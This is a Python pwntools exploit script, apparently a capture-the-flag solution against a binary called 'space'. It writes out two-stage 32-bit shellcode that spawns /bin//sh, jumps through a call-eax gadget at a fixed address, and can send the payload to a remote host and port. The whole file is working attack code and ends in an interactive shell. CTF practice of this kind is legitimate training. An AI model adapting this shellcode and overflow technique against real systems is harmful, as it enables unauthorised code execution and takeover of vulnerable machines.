from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './space'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = start()
call_eax = 0x08049019
log.info('CALL_EAX gadget --> %#0x', call_eax)

# 8 bytes
# we can't do mov eax, 0xb. Because the length shall be 10
# why 11?? Because distance from first A to last A is 11 
# it will loop through the last offset before 8 bytes space
first_shell = """
xor ecx, ecx
push ecx
push 0xb 
pop eax
jmp $+11
"""
shell_1 = asm(first_shell)
print('[INFO] --> LENGTH SHELL 1',len(shell_1))

# 18 bytes
# adding 2 NOPs as paddings so our shellcode length shall be exact 18.
second_shell = """
xor edx, edx
push 0x68732f2f # //sh
push 0x6e69622f # bin
mov ebx, esp
int 0x80
nop 
nop 
"""
shell_2 = asm(second_shell)
print('[INFO] --> LENGTH SHELL 2',len(shell_2))

p = flat([
    shell_2,
    call_eax,
    shell_1
])

sh.sendlineafter(b'>',p)
sh.interactive()
